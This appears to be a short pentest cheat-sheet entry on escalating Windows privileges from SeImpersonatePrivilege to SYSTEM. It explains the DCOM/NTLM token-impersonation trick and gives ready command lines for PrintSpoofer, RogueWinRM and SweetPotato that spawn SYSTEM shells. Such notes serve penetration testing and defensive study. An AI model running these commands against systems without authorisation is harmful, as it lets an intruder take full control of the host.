Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle.
You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM.
Exploit it with [juicy-potatato](https://github.com/ohpe/juicy-potato) or [RougueWinRM](https://github.com/antonioCoco/RogueWinRM) (need winRM disabled) or [SweetPotato](https://github.com/CCob/SweetPotato) or [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).


Some commands for these tools:

1. PrintSpoofer (My favorite) : ```PrintSpoofer.exe -i -c powershell```

<p align="center">
  <img src="demo.gif">
</p>

2. RogueWinRM : ```RogueWinRM.exe -p C:\windows\system32\cmd.exe``` or ```RogueWinRM.exe -p C:\windows\system32\cmd.exe -a "powershell"```
3. SweetPotato : ```SweetPotato.exe -a whoami```
